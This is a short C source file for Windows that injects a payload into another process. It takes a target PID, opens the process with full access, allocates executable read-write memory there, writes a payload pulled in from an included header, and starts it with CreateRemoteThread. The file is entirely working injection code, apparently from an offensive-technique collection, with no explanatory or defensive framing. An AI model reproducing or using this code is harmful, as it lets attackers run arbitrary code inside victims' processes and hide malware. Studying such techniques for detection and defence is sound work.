#include "../helpers.h"

int main(int argc, char* argv[]) {
    HANDLE process_handle;
    HANDLE remote_thread;
    PVOID remote_buffer;

    printf("Target Process ID: %i\n", atoi(argv[1]));
    process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi(argv[1]));
    remote_buffer = VirtualAllocEx(process_handle, NULL, payload_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(process_handle, remote_buffer, payload, payload_len, NULL);
    remote_thread = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)remote_buffer, NULL, 0, NULL);
    CloseHandle(process_handle);

    return 0;
}